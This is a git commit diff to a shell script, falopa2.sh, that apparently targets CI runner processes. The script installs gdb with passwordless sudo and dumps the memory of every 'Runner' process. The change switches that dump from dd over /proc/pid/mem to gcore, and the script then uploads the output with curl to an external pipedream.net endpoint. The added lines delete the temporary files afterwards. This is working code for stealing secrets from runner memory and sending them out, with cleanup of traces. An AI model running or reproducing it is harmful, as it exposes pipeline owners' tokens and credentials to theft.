3185cfd09ae61cb2aa4d0824b8155e3a14b4b577
_m <matiasesena@gmail.com>
2021-11-04 15:23:57 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -3,23 +3,14 @@
 # install gdb sudo is passwordless according to doc
 sudo apt-get install gdb -y > /tmp/file.txt
 
-mkdir dumps
-echo "STARTING..." >> /tmp/file.txt
-
-# get pids related to runners and dump their memory
+# get pids related to runners
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
-    echo "-----$pid-----" >> /tmp/file.txt;
-    cat /proc/$pid/maps | grep "rw-p" | awk '{print $pid}' | ( IFS="-"
-    while read a b; do
-        dd if=/proc/$pid/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
-           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$pid_mem_$a.bin"
-    done ) >> /tmp/file.txt;
-    echo "--------------" >> /tmp/file.txt;
+    echo "---$pid---"
+    gcore $pid >> /tmp/file.txt
 done
 
-echo "FINISHED..." >> /tmp/file.txt
-
-rm -rf dumps/
-
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
+
+rm /tmp/file.txt
+rm /tmp/run-results.txt
